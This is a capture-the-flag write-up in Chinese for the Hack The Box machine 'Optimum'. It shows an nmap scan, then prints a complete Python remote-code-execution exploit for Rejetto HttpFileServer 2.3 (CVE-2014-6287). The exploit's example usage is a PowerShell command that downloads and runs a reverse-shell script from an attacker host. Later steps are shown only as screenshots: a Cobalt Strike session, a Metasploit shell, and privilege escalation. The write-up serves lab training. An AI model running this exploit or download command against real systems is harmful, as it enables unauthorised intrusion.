# Optimum

目标ip：`10.10.10.8`

攻击机ip：`10.10.16.218`



## 信息收集

```shell
C:\opt\htb\attacks\Optimum> cat nmap.txt 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-03 02:40 EDT
Nmap scan report for 10.10.10.8
Host is up (0.37s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.89 seconds

```



## web

目标使用 HttpFileServer 2.3 ， 猜测存在漏洞

![image-20210603150907324](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603150907324.png)

```python
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)                                              
```

运行一下，cs 上线

![image-20210603151008552](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603151008552.png)

上传 msf 的马， 得到一个 msf shell

![image-20210603151124202](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603151124202.png)

看看提权建议

![image-20210603151139208](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603151139208.png)

尝试提权， 成功

![image-20210603151237762](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603151237762.png)

